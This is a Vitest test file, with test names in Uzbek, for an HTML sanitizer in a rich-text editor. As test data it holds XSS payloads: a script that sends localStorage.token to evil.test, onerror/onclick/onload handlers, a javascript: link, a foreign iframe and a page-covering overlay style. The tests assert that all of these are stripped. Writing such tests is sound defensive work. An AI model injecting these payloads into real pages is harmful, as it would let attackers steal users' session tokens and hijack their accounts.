import { describe, it, expect } from "vitest";
import { sanitizeContent } from "../sanitizeContent";

describe("sanitizeContent — xavfli narsalarni tashlaydi", () => {
  it("<script> teg va ichidagi kodni butunlay olib tashlaydi", () => {
    const out = sanitizeContent(
      `<p>matn</p><script>fetch('https://evil.test/?t='+localStorage.token)</script>`
    );
    expect(out).not.toMatch(/<script/i);
    expect(out).not.toContain("evil.test");
    expect(out).toContain("<p>matn</p>");
  });

  it("hodisa atributlarini (on*) olib tashlaydi", () => {
    expect(sanitizeContent(`<img src="x" onerror="alert(1)">`)).not.toMatch(/onerror/i);
    expect(sanitizeContent(`<div onclick="alert(1)">a</div>`)).not.toMatch(/onclick/i);
    expect(sanitizeContent(`<svg onload="alert(1)"></svg>`)).not.toMatch(/onload/i);
  });

  it("javascript: sxemali havolani zararsizlantiradi", () => {
    const out = sanitizeContent(`<a href="javascript:alert('xss')">bos</a>`);
    expect(out).not.toMatch(/javascript:/i);
    expect(out).toContain("bos");
  });

  it("<iframe> va <svg> teglariga ruxsat bermaydi", () => {
    expect(sanitizeContent(`<iframe src="https://evil.test"></iframe>`)).not.toMatch(/<iframe/i);
    expect(sanitizeContent(`<svg><circle /></svg>`)).not.toMatch(/<svg/i);
  });

  it("sahifani qoplaydigan style qiymatlarini o'tkazmaydi", () => {
    const out = sanitizeContent(
      `<div style="position:fixed;top:0;width:100%;height:100%">qatlam</div>`
    );
    expect(out).not.toMatch(/position\s*:\s*fixed/i);
  });
});

describe("sanitizeContent — muharrir chiqaradigan narsani saqlaydi", () => {
  it("matn tuzilishini saqlaydi", () => {
    const out = sanitizeContent(
      `<h2>Sarlavha</h2><p><strong>qalin</strong> va <em>kursiv</em></p><ul><li>bir</li></ul>`
    );
    expect(out).toContain("<h2>Sarlavha</h2>");
    expect(out).toContain("<strong>qalin</strong>");
    expect(out).toContain("<em>kursiv</em>");
    expect(out).toContain("<li>bir</li>");
  });

  it("jadval va colspan'ni saqlaydi", () => {
    const out = sanitizeContent(
      `<table><tr><th colspan="2">Ustun</th></tr><tr><td>a</td><td>b</td></tr></table>`
    );
    expect(out).toContain("<table>");
    expect(out).toContain('colspan="2"');
  });

  it("kod bloki uchun class atributini saqlaydi (lowlight bo'yashi uchun)", () => {
    const out = sanitizeContent(`<pre><code class="language-js">const x = 1;</code></pre>`);
    expect(out).toContain('class="language-js"');
  });

  it("https rasm va havolani saqlaydi", () => {
    const out = sanitizeContent(
      `<img src="https://res.cloudinary.com/demo/a.jpg" alt="rasm"><a href="https://example.com">havola</a>`
    );
    expect(out).toContain("res.cloudinary.com/demo/a.jpg");
    expect(out).toContain('href="https://example.com"');
    expect(out).toContain('alt="rasm"');
  });

  it("target=_blank havolaga rel qo'shadi (tabnabbing'dan himoya)", () => {
    const out = sanitizeContent(`<a href="https://example.com" target="_blank">havola</a>`);
    expect(out).toContain('rel="noopener noreferrer nofollow"');
  });
});

describe("YouTube video", () => {
  it("YouTube embed saqlanadi — muharrirdagi video bloki yo'qolmasin", () => {
    const html =
      '<div data-youtube-video><iframe src="https://www.youtube-nocookie.com/embed/abc123" width="840" height="472"></iframe></div>';
    const out = sanitizeContent(html);
    expect(out).toContain("iframe");
    expect(out).toContain("youtube-nocookie.com/embed/abc123");
  });

  it("youtube.com ham qabul qilinadi", () => {
    const out = sanitizeContent('<iframe src="https://www.youtube.com/embed/xyz"></iframe>');
    expect(out).toContain("youtube.com/embed/xyz");
  });

  it("begona saytdagi iframe butunlay olib tashlanadi", () => {
    const out = sanitizeContent('<iframe src="https://evil.example.com/x"></iframe>');
    expect(out).not.toContain("evil.example.com");
    expect(out).not.toContain("iframe");
  });
});
